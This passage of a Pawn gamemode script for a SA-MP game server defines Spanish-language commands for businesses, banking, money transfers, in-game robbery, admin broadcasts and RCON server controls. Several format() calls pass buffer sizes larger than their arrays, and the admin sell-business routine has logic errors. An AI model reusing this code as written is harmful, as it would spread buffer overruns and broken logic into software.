	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}
//----------------------------------GoTo Business-------------------------------
CMD:gotobiz(playerid,params[]) {
	if(PlayerInfo[playerid][Jailed] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes usar comandos estando encarcelado.");
	if(PlayerInfo[playerid][LoggedIn] == 1 && PlayerInfo[playerid][bowner] == 1) {
	    TimedTele(playerid, " ", BizInfo[PlayerInfo[playerid][bowned]][xpos],BizInfo[PlayerInfo[playerid][bowned]][ypos],BizInfo[PlayerInfo[playerid][bowned]][zpos], BizInfo[PlayerInfo[playerid][bowned]][inter], 11);
	    new PlayerName[MAX_PLAYER_NAME];
        GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
        format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a su negocio. {00BFFF}(/GotoBiz)",PlayerName);
        GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~tu negocio",2500,3);
        SendClientMessageToAll(red, fString);
        SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid,0);
		return 1;
	}
	SendClientMessage(playerid, red, "|Error| »{EAEAEA} Tu no tienes negocio.");
	return 1;
}
//---------------------------------Admin Sell Biz-------------------------------
CMD:asellbiz(playerid,params[]) {
	new string[128];
	if(PlayerInfo[playerid][LoggedIn] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar fuera del vehiculo.");
		return 1;
	}
	if(ClosestBiz(playerid) >= 999) {
		SendClientMessage(playerid, red, "|Error| »{FFFFFF} Debes estar cerca del icono.");
		return 1;
	}
	if (PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
		if (strcmp(BizInfo[ClosestBiz(playerid)][owner],DEFAULT_OWNER,false) == 0) {
			format(string,sizeof(string),"|Error| »{EAEAEA} Este negocio aun esta en venta",BizInfo[ClosestBiz(playerid)][name]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		new file[256];
		format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(BizInfo[ClosestBiz(playerid)][owner]));
		if(fexist(file)) {
			tempid[playerid] = IsPlayerNameOnline(BizInfo[ClosestBiz(playerid)][owner]);
			if(tempid[playerid] >= 0 || tempid[playerid] <= MAX_PLAYERS) {
				strmid(BizInfo[ClosestBiz(playerid)][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
				BizInfo[ClosestBiz(playerid)][bought] = 0;
				BizInfo[ClosestBiz(playerid)][cashbox] = 0;

				new cbmon = BizInfo[ClosestBiz(playerid)][cashbox];
				new bmon = PlayerInfo[playerid][bank];
				PlayerInfo[tempid[playerid]][bank] = cbmon+bmon;
				PlayerInfo[tempid[playerid]][bowned] = 0;
				PlayerInfo[tempid[playerid]][bowner] = 0;

				format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender el negocio de {0080FF}%s.", PlayerInfo[tempid[playerid]][name], BizInfo[ClosestBiz(playerid)][name]);
				SendClientMessage(playerid, red, string);
				format(string, sizeof(string), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} vendio tu negocio. El dinero fue enviado al banco.", PlayerInfo[playerid][name],BizInfo[ClosestBiz(playerid)][name]);
				SendClientMessage(tempid[playerid], red, string);
				new bizowner[30];
				format(bizowner,128,"%s",BizInfo[ClosestBiz(playerid)][owner]);
				if(strcmp(BizInfo[ClosestBiz(playerid)][owner],DEFAULT_OWNER,false) == 0) {
			    	format(bizowner,128,"En venta");
				}
				UpdateDynamic3DTextLabelText(bizTextInfo[ClosestBiz(playerid)],0xFF0000FF,bizowner);
				new bId = ClosestBiz(playerid);
				DestroyDynamicMapIcon(BizInfo[bId][ico]);
				BizInfo[bId][ico] = CreateDynamicMapIcon(BizInfo[bId][xpos],BizInfo[bId][ypos],BizInfo[bId][zpos],52,250);
				return 1;
			}
			else {
				ResetOfflinePlayerFileB(file, ClosestBiz(playerid));
				format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender el negocio de {0080FF}%s.", PlayerInfo[tempid[playerid]][name], BizInfo[ClosestBiz(playerid)][name]);
				SendClientMessage(playerid, red, string);
				return 1;
			}
		}
		if(!fexist(file)) {
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender el negocio de {0080FF}%s.", PlayerInfo[tempid[playerid]][name], BizInfo[ClosestBiz(playerid)][name]);
			SendClientMessage(playerid, red, string);
			BizInfo[ClosestBiz(playerid)][bought] = 0;
			BizInfo[ClosestBiz(playerid)][cashbox] = 0;
			strmid(BizInfo[ClosestBiz(playerid)][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
			new bizowner[30];
			format(bizowner,128,"%s",BizInfo[ClosestBiz(playerid)][owner]);
			if(strcmp(BizInfo[ClosestBiz(playerid)][owner],DEFAULT_OWNER,false) == 0) {
		    	format(bizowner,128,"En venta");
			}
			UpdateDynamic3DTextLabelText(bizTextInfo[ClosestBiz(playerid)],0xFF0000FF,bizowner);
			new bId = ClosestBiz(playerid);
			DestroyDynamicMapIcon(BizInfo[bId][ico]);
			BizInfo[bId][ico] = CreateDynamicMapIcon(BizInfo[bId][xpos],BizInfo[bId][ypos],BizInfo[bId][zpos],52,250);
			return 1;
		}
	}
	SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	return 1;
}
//-----------------------------------Buy Biz------------------------------------*/
CMD:buybiz(playerid,params[]) {
	new string[128];
	new nombre[MAX_PLAYER_NAME];
	GetPlayerName(playerid, nombre, sizeof(nombre));
	//if(GetPlayerScore(playerid)<=-75) return SendClientMessage(playerid, red, "[ERROR]:{EAEAEA} Debes tener mas de {FF0000}75{EAEAEA} de score para poder comprar negocios.");
	if(PlayerInfo[playerid][LoggedIn] == 0) {
		SendClientMessage(playerid, red, "[ERROR]:{EAEAEA} Debes estar registrado para poder usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][Jailed] == 1) {
		SendClientMessage(playerid, red, "[ERROR]:{EAEAEA} No puedes usar comandos estando encarcelado.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "[ERROR]:{EAEAEA} Debes estar fuera del vehiculo.");
		return 1;
	}
	if(ClosestBiz(playerid) == 999) {
		SendClientMessage(playerid, red, "[ERROR]:{EAEAEA} Debes estar cerca del icono.");
		return 1;
	}
	if (strcmp(BizInfo[ClosestBiz(playerid)][owner],/*PlayerInfo[playerid][name]*/nombre,false) == 0) {
		format(string, sizeof(string), "[ERROR]:{EAEAEA} Ya eres dueño de este negocio {5783C2}(%s).", BizInfo[ClosestBiz(playerid)][name]);
		SendClientMessage(playerid, red, string);
		return 1;
	}
	if(BizInfo[ClosestBiz(playerid)][bought] == 1) {
		format(string, sizeof(string), "[ERROR]:{EAEAEA} Este negocio es de {0080FF}%s.", BizInfo[ClosestBiz(playerid)][owner]);
		SendClientMessage(playerid, red, string);
		return 1;
	}
	if(PlayerInfo[playerid][bowner] == 1) {
		SendClientMessage(playerid, red, "[ERROR]:{EAEAEA} Solo puedes comprar 1 negocio.");
 		return 1;
	}
	new cash[MAX_PLAYERS];
	cash[playerid] = GetPlayerMoney(playerid);
	if(cash[playerid] >= BizInfo[ClosestBiz(playerid)][cost]) {
		new stringa[150], pname[24];
        GetPlayerName(playerid, pname, 24);
		strmid(BizInfo[ClosestBiz(playerid)][owner], nombre/*PlayerInfo[playerid][name]*/, 0, strlen(/*PlayerInfo[playerid][name]*/nombre), 255);
		BizInfo[ClosestBiz(playerid)][bought] = 1;
		PlayerInfo[playerid][bowner] = 1;
		PlayerInfo[playerid][bowned] = ClosestBiz(playerid);
		GivePlayerMoney(playerid, -BizInfo[ClosestBiz(playerid)][cost]);
		format(stringa, sizeof(stringa), "[INFO]:{0080FF} %s{EAEAEA} compro el negocio {5783C2}%s{EAEAEA} por {52C433}$%d.", pname, BizInfo[ClosestBiz(playerid)][name],BizInfo[ClosestBiz(playerid)][cost]);
		SendClientMessageToAll(red, stringa);

		new bizowner[30];
		format(bizowner,128,"%s",BizInfo[ClosestBiz(playerid)][owner]);
		if(strcmp(BizInfo[ClosestBiz(playerid)][owner],DEFAULT_OWNER,false) == 0) {
	    	format(bizowner,128,"En venta");
		}
		UpdateDynamic3DTextLabelText(bizTextInfo[ClosestBiz(playerid)],0xFF0000FF,bizowner);
		new bId = ClosestBiz(playerid);
		DestroyDynamicMapIcon(BizInfo[bId][ico]);
		BizInfo[bId][ico] = CreateDynamicMapIcon(BizInfo[bId][xpos],BizInfo[bId][ypos],BizInfo[bId][zpos],52,250);
		SavePlayer(playerid);
		SaveBusinesses();
		return 1;
	}
	if(cash[playerid] < BizInfo[ClosestBiz(playerid)][cost]) {
		format(string, sizeof(string), "[ERROR]:{EAEAEA} Necesitas {52C433}$%d{EAEAEA} para comprar este negocio.", BizInfo[ClosestBiz(playerid)][cost]);
		SendClientMessage(playerid, red, string);
		return 1;
	}
	return 1;
}
//-------------------------------------Sell Biz---------------------------------
CMD:sellbiz(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar fuera del vehiculo.");
		return 1;
	}
	if(ClosestBiz(playerid) == 999) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar cerca del icono.");
		return 1;
	}
	if(PlayerInfo[playerid][bowner] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Tu no tienes ningun negocio.");
		return 1;
	}
	if (strcmp(BizInfo[ClosestBiz(playerid)][owner],PlayerInfo[playerid][name],false) == 0) {
		PlayerInfo[playerid][bowned] = 0;
		PlayerInfo[playerid][bowner] = 0;
		strmid(BizInfo[ClosestBiz(playerid)][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
		BizInfo[ClosestBiz(playerid)][bought] = 0;
		new cbmon = BizInfo[ClosestBiz(playerid)][cashbox],bmon = PlayerInfo[playerid][bank];
		BizInfo[ClosestBiz(playerid)][cashbox] = 0;
		PlayerInfo[playerid][bank] = cbmon+bmon;
		GivePlayerMoney(playerid, BizInfo[ClosestBiz(playerid)][cost]);
		new bsmsg[150];
		format(bsmsg, sizeof(bsmsg), "|Info| »{EAEAEA} Acabas de vender tu negocio por {52C433}$%d. {EAEAEA}El dinero generado fue transferido al banco {52C433}($%d).", BizInfo[ClosestBiz(playerid)][cost],cbmon);
		SendClientMessage(playerid, red, bsmsg);

		new bizowner[30];
		format(bizowner,128,"%s",BizInfo[ClosestBiz(playerid)][owner]);
		if(strcmp(BizInfo[ClosestBiz(playerid)][owner],DEFAULT_OWNER,false) == 0) {
	    	format(bizowner,128,"En Venta");
		}
		UpdateDynamic3DTextLabelText(bizTextInfo[ClosestBiz(playerid)],0x00FF00FF,bizowner);

		new bId = ClosestBiz(playerid);
		DestroyDynamicMapIcon(BizInfo[bId][ico]);
		BizInfo[bId][ico] = CreateDynamicMapIcon(BizInfo[bId][xpos],BizInfo[bId][ypos],BizInfo[bId][zpos],52,250);
		SavePlayer(playerid);
		SaveBusinesses();
		return 1;
	}
	else {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este no es tu negocio.");
		return 1;
	}
}
//---------------------------------Get Biz Profit-------------------------------
CMD:cashbox(playerid,params[]) {
	new string[128];
	if(PlayerInfo[playerid][LoggedIn] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar fuera del vehiculo.");
		return 1;
	}
	if(ClosestBiz(playerid) == 999) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar cerca del icono.");
		return 1;
	}
	if(PlayerInfo[playerid][bowner] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Tu no tienes ningun negocio.");
		return 1;
	}
	if (strcmp(BizInfo[ClosestBiz(playerid)][owner],PlayerInfo[playerid][name],false) == 0) {
		new cbmon = BizInfo[ClosestBiz(playerid)][cashbox],bmon = PlayerInfo[playerid][bank];
		PlayerInfo[playerid][bank] = cbmon+bmon;
		format(string, sizeof(string), "|Info| »{EAEAEA} Tu negocio genero un total de {52C433}$%d{EAEAEA} y fue enviado al banco.", BizInfo[ClosestBiz(playerid)][cashbox]);
		SendClientMessage(playerid, red, string);
		BizInfo[ClosestBiz(playerid)][cashbox] = 0;
		SavePlayer(playerid);
		return 1;
	}
	else {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este no es tu negocio.");
		return 1;
	}
}
//---------------------------------Bank System----------------------------------
CMD:deposit(playerid,params[]) {
	new moneys, string[150];
	if (sscanf(params, "d", moneys)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Deposit [Dinero]");
	if(PlayerInfo[playerid][LoggedIn] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		return 1;
	}
	if(CloseToBank(playerid) == 999) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el banco.");
		return 1;
	}
	if(moneys < 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ingresar una cantidad mayor que 0.");
		return 1;
	}
	if(moneys > 9999999999) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ingresar una cantidad menor que 10.000.000.000.");
		return 1;
	}
	if(GetPlayerMoney(playerid) < moneys) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Tu no tienes dinero.");
		return 1;
	}
	GivePlayerMoney(playerid, 0-moneys);
	PlayerInfo[playerid][bank] = PlayerInfo[playerid][bank]+moneys;
	format(string, sizeof(string), "|Info| »{EAEAEA} Has depositado {52C433}$%d{EAEAEA}. Total depositado {52C433}$%d.", moneys, PlayerInfo[playerid][bank]);
	SendClientMessage(playerid, red, string);
	SavePlayer(playerid);
	return 1;
}

CMD:withdraw(playerid,params[]) {
	new moneys, string[150];
	if (sscanf(params, "d", moneys)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /WithDraw [Dinero]");
	if(PlayerInfo[playerid][LoggedIn] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		return 1;
	}
	if(CloseToBank(playerid) == 999) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el banco.");
		return 1;
	}
	if(moneys < 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ingresar una cantidad mayor que 0.");
		return 1;
	}
	if(moneys > PlayerInfo[playerid][bank]) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Tu no tienes ese dinero en el banco.");
		return 1;
	}
	new moneytemp;
	moneytemp = GetPlayerMoney(playerid);
	if(moneytemp+moneys > 9999999999) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ingresar una cantidad menor que 10.000.000.000.");
		return 1;
	}
	GivePlayerMoney(playerid, 0+moneys);
	PlayerInfo[playerid][bank] = PlayerInfo[playerid][bank]-moneys;
	format(string, sizeof(string), "|Info| »{EAEAEA} Has retirado {52C433}$%d. {EAEAEA}Total depositado {52C433}$%d.", moneys, PlayerInfo[playerid][bank]);
	SendClientMessage(playerid, red, string);
	SavePlayer(playerid);
	return 1;
}

//-----------------------------------Balance------------------------------------
CMD:balance(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		return 1;
	}
	if(CloseToBank(playerid) == 999) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el banco.");
		return 1;
	}
	new string[100];
	format(string, sizeof(string), "|Info| »{EAEAEA} Tienes un total de {52C433}$%d{EAEAEA} en el banco.", PlayerInfo[playerid][bank]);
	SendClientMessage(playerid, red, string);
	return 1;
}
//----------------------------------Give Cash-----------------------------------
CMD:dardinero(playerid,params[]) {
	new moneys,giveplayerid,giveplayer[MAX_PLAYER_NAME],sendername[MAX_PLAYER_NAME],playermoney[MAX_PLAYERS],string[128];
	if(GetPlayerScore(playerid)<=49) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener mas de {FF0000}50{EAEAEA} de score para poder dar dinero.");
	if (sscanf(params, "ud",giveplayerid, moneys)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Dardinero [JugadorID] [Cantidad]");
//	if (!IsNumeric(giveplayerid)) giveplayerid = ReturnPlayerID(giveplayerid);
    if(CloseToBank(playerid) == 999)
    {
    SendClientMessage(playerid,red, "|Error| »{EAEAEA} Tienes que estar en el banco para poder transferir dinero.");
    return 1;
    }
	if (IsPlayerConnected(giveplayerid)) {
		GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
		GetPlayerName(playerid, sendername, sizeof(sendername));
		playermoney[playerid] = GetPlayerMoney(playerid);
		if (moneys > 0 && playermoney[playerid] >= moneys) {
			GivePlayerMoney(playerid, (-moneys));
			GivePlayerMoney(giveplayerid, moneys);
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has enviado a {52C433}$%d{EAEAEA} a %s.",  moneys, giveplayer);
			SendClientMessage(playerid, red, string);
			format(string, sizeof(string), "|Info| »{EAEAEA} Has recibido {52C433}$%d{EAEAEA} de %s.", moneys, sendername);
			SendClientMessage(giveplayerid, red, string);
			//printf("{FF0000}|Info| »{FFFFFF} %s le ha transferido {52C433}$%d{FFFFFF} a %s.",sendername, moneys, giveplayer);
			format(string, 1000, "|Bank| » {0080FF}%s{EAEAEA} le ha transferido {52C433}$%d{EAEAEA} a {0080FF}%s.",sendername, moneys, giveplayer);
            SendClientMessageToAll(red, string);
		}
		else {
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Cantidad de la transaccion no valida.");
		}
	}
	else {
		format(string, sizeof(string), "|Error| »{EAEAEA} ID no encontrada.", giveplayerid);
		SendClientMessage(playerid, red, string);
	}
	return 1;
}
//-----------------------------------Count Down---------------------------------
CMD:conteo(playerid,params[]) {
	new ccseconds;
	new string[95];
	new sendername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, sendername, sizeof(sendername));
	if (sscanf(params, "i", ccseconds)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Conteo [Segundos]");
	if(PlayerInfo[playerid][Jailed] == 1) {
	SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes usar comandos estando en la cárcel.");
	return 1;
	}
	if (isnull(params)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debe ingresar una duración en segundos.");
	if (!IsNumeric(params)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debe ingresar una duración en segundos.");
	if (ccseconds < 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ingresar una duración entre 1 y 20 segundos.");
	if (ccseconds > 20) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ingresar una duración entre 1 y 20 segundos.");
	if (cseconds) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya hay un conteo, espera a que termine.");
	CountingTimer = SetTimer("ctimer", 1000, true);
	format(string, 1000, "|Info| »{0080FF} %s {EAEAEA}ha iniciado un conteo de %d segundos.", sendername, ccseconds);
	SendClientMessageToAll(red, string);
    GameTextForPlayer(playerid,"",2500,3);
	cseconds = ccseconds+1;
	cCount[playerid] = 1;
	return 1;
}
CMD:rob(playerid,params[]) {
	new giveplayerid,string[128];
	if (sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Rob [JugadorID]");
//	if (!IsNumeric(giveplayerid)) giveplayerid = ReturnPlayerID(giveplayerid);
	if(IsSpawned[playerid] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estás muerto. No puedes usar este comando.");
		return 1;
	}
	if(RobbedPlyRecent[playerid] == 1) {
		SendClientMessage(playerid,red,"|Info| »{EAEAEA} Comando usado recientemente, por favor espere...");
		return 1;
	}
	if(giveplayerid == playerid) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes robarte a ti mismo.");
		return 1;
	}
	if(!IsPlayerConnected(giveplayerid)) {
		format(string, sizeof(string), "|Error| »{EAEAEA} ID no encontrada.", giveplayerid);
		SendClientMessage(playerid, red, string);
		return 1;
	}
	new rname[24];
	new vname[24];
	GetPlayerName(playerid,rname, 24);
	GetPlayerName(giveplayerid, vname, 24);
	if(GetDistanceBetweenPlayers(playerid,giveplayerid) > 3) {
		format(string, sizeof(string), "|Error| »{EAEAEA} Debes estar cerca del jugador.",vname,giveplayerid);
		SendClientMessage(playerid, red, string);
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar fuera del vehiculo.");
		return 1;
	}
	if(PlayerInfo[giveplayerid][Jailed] == 1) {
		format(string, sizeof(string), "|Error| »{EAEAEA} El jugador está en la cárcel. No puedes robarle a un prisionero.",vname,giveplayerid);
		SendClientMessage(playerid, red, string);
		return 1;
	}
	if(IsPlayerInAnyVehicle(giveplayerid)) {
		format(string, sizeof(string), "|Error| »{EAEAEA} El jugador debe estar fuera del vehiculo.",vname,giveplayerid);
		SendClientMessage(playerid, red, string);
		return 1;
	}
	if(GetPlayerMoney(giveplayerid) <= 100) {
		format(string, sizeof(string), "|Info| »{EAEAEA} El jugador esta en quiebra (No tiene dinero).",vname,giveplayerid);
		SendClientMessage(playerid, red, string);
		return 1;
	}
	/*if(PlayerInfo[giveplayerid][Level] > 0) {
		format(string, sizeof(string), "|Error| »{FFFFFF} No puedes robarle a un administrador.",vname,giveplayerid);
		SendClientMessage(playerid, red, string);
		return 1;
	}*/
	if(beenrobbedrecently[giveplayerid] >= 1) {
		format(string, sizeof(string), "|Error| »{EAEAEA} El jugador ha sido robado recientemente... Por favor espere.",vname,giveplayerid);
		SendClientMessage(playerid, red, string);
		return 1;
	}
	new rpcash;
	if(GetPlayerMoney(giveplayerid)<=30000) rpcash = random(GetPlayerMoney(giveplayerid));
	else if(GetPlayerMoney(giveplayerid)>30000) rpcash = random(30000);
	GivePlayerMoney(playerid,rpcash/50);
	GivePlayerMoney(giveplayerid, -rpcash/50);
	OldCash[giveplayerid] -=rpcash/50;
	format(string, sizeof(string), "~w~%s Te ha robado~n~~g~$%d",rname,rpcash/50);
	GameTextForPlayer(giveplayerid,string,5000,3);
	SetPlayerScore(playerid, GetPlayerScore(playerid) +1);
	format(string, sizeof(string), "~w~Le has robado a %s~n~~g~$%d",vname,rpcash/50);
	GameTextForPlayer(playerid,string,5000,3);
	RobbedPlyRecent[playerid] =1;
	beenrobbedrecently[giveplayerid] =120;
	commitedcrimerecently[playerid] +=120;

	return 1;
}
//------------------------------------------------------------------------------
CMD:spam(playerid,params[]) {
	new Colour,string[128];
	if (sscanf(params, "is", Colour,string)) {
     SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Spam [Color] [Texto]");
 	 SendClientMessage(playerid, red, "|Colores| »{EAEAEA} [0=Negro |1=Blanco |2=Rojo |3=Naranja |4=Amarillo |5=Verde |6=Azul |7=Purpura |8=Marron |9=Rosa]");
 	 return 1;
	}
	if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
		if(Colour > 9 ) return SendClientMessage(playerid, red, "|Colores| »{FFFFFF} [0=Negro |1=Blanco |2=Rojo |3=Naranja |4=Amarillo |5=Verde |6=Azul |7=Purpura |8=Marron |9=Rosa]");
        if(Colour == 0) 	 for(new i; i < 50; i++) SendClientMessageToAll(black,string);
        else if(Colour == 1) for(new i; i < 50; i++) SendClientMessageToAll(COLOR_WHITE,string);
        else if(Colour == 2) for(new i; i < 50; i++) SendClientMessageToAll(red,string);
        else if(Colour == 3) for(new i; i < 50; i++) SendClientMessageToAll(orange,string);
        else if(Colour == 4) for(new i; i < 50; i++) SendClientMessageToAll(yellow,string);
        else if(Colour == 5) for(new i; i < 50; i++) SendClientMessageToAll(COLOR_GREEN1,string);
        else if(Colour == 6) for(new i; i < 50; i++) SendClientMessageToAll(COLOR_BLUE,string);
        else if(Colour == 7) for(new i; i < 50; i++) SendClientMessageToAll(COLOR_PURPLE,string);
        else if(Colour == 8) for(new i; i < 50; i++) SendClientMessageToAll(COLOR_BROWN,string);
        else if(Colour == 9) for(new i; i < 50; i++) SendClientMessageToAll(COLOR_PINK,string);
		CMDMessageToAdmins(playerid,"/Spam");
		return 1;
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 5{EAEAEA} para usar este comando.");
}
//------------------------------------------------------------------------------
CMD:write(playerid,params[]) {
	new Colour,string[128];
	if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
		if (sscanf(params, "is", Colour,string)) {
			SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Write [Color] [Texto]");
			SendClientMessage(playerid, red, "|Colores| »{EAEAEA} [0=Negro |1=Blanco |2=Rojo |3=Naranja |4=Amarillo |5=Verde |6=Azul |7=Purpura |8=Marron |9=Rosa]");
			return 1;
		}
        CMDMessageToAdmins(playerid,"/Write");
        if(Colour == 0) {SendClientMessageToAll(black,string); return 1;	}
        else if(Colour == 1) {SendClientMessageToAll(COLOR_WHITE,string); return 1;	}
        else if(Colour == 2) {SendClientMessageToAll(red,string); return 1;	}
        else if(Colour == 3) {SendClientMessageToAll(orange,string); return 1;	}
        else if(Colour == 4) {SendClientMessageToAll(yellow,string); return 1;	}
        else if(Colour == 5) {SendClientMessageToAll(COLOR_GREEN1,string); return 1;	}
        else if(Colour == 6) {SendClientMessageToAll(COLOR_BLUE,string); return 1;	}
        else if(Colour == 7) {SendClientMessageToAll(COLOR_PURPLE,string); return 1;	}
        else if(Colour == 8) {SendClientMessageToAll(COLOR_BROWN,string); return 1;	}
        else if(Colour == 9) {SendClientMessageToAll(COLOR_PINK,string); return 1;	}
        return 1;
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
}
//------------------------------------------------------------------------------
//                      Remote Console
//------------------------------------------------------------------------------
CMD:loadfs(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		SendRconCommand("loadfs");
	    return SendClientMessage(playerid,COLOR_WHITE,"RCON Command Sent");
   	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
}
CMD:unloadfs(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		SendRconCommand("unloadfs");
	    return SendClientMessage(playerid,COLOR_WHITE,"RCON Command Sent");
   	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
}
CMD:changemode(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		SendRconCommand("changemode");
	    return SendClientMessage(playerid,COLOR_WHITE,"RCON Command Sent");
   	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
}
CMD:gmx(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		SendRconCommand("gmx");
		return SendClientMessage(playerid,COLOR_WHITE,"RCON Command Sent");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
}
//-------------------------Buy or Sell Vehicle Commands-------------------------
CMD:vbuy(playerid,params[]) {
    #pragma unused params
    if(GetPlayerScore(playerid)<=75) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener mas de {FF0000}75{EAEAEA} de score para poder comprar vehiculos.");
	buycar(playerid);
	return 1;
}
CMD:vsell(playerid,params[]) {
    #pragma unused params
    if(GetPlayerScore(playerid)<=75) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener mas de {FF0000}75{EAEAEA} de score para poder usar este comando.");
	sellcar(playerid);
	return 1;
}
CMD:vpark(playerid,params[]) {
    #pragma unused params
    if(GetPlayerScore(playerid)<=75) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener mas de {FF0000}75{EAEAEA} de score para poder usar este comando.");
    if(GetPlayerMoney(playerid)<=10000) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener {52C433}$10.000{EAEAEA} para poder aparcar tu vehiculo.");
    GivePlayerMoney(playerid, -10000);
	park(playerid);
    return 1;
}
CMD:vparkadmin(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
    	#pragma unused params
    	//if(GetPlayerScore(playerid)<=75) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener mas de {FF0000}75{EAEAEA} de score para poder usar este comando.");
   	 	//if(GetPlayerMoney(playerid)<=10000) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener {52C433}$10.000{EAEAEA} para poder aparcar tu vehiculo.");
